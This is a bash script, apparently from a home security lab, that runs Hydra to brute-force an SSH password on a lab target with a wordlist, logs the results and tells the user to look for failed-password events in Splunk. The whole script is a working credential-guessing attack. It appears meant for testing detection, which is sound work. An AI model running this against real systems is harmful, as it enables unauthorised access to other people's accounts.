#!/usr/bin/env bash
# Attack 1: SSH password brute force with Hydra (LAB ONLY)
# Usage: ./01_brute_force_ssh.sh [target_ip] [username]

set -euo pipefail

TARGET="${1:-192.168.56.40}"
USER="${2:-targetuser}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST="${SCRIPT_DIR}/wordlist-lab.txt"
OUTDIR="${SCRIPT_DIR}/../../Reports/raw"
mkdir -p "${OUTDIR}"

if ! command -v hydra >/dev/null 2>&1; then
  echo "[!] hydra not found. Install: sudo apt install hydra"
  exit 1
fi

if [[ ! -f "${WORDLIST}" ]]; then
  echo "[!] Missing wordlist: ${WORDLIST}"
  exit 1
fi

echo "[*] Target : ${TARGET}"
echo "[*] User   : ${USER}"
echo "[*] Wordlist: ${WORDLIST}"
echo "[*] Starting Hydra SSH brute force (lab only)..."

hydra -l "${USER}" -P "${WORDLIST}" \
  "ssh://${TARGET}" \
  -t 4 -V -f \
  -o "${OUTDIR}/hydra-ssh-${TARGET}.txt"

echo "[+] Done. Results: ${OUTDIR}/hydra-ssh-${TARGET}.txt"
echo "[*] Check Splunk for Failed password events from this host."
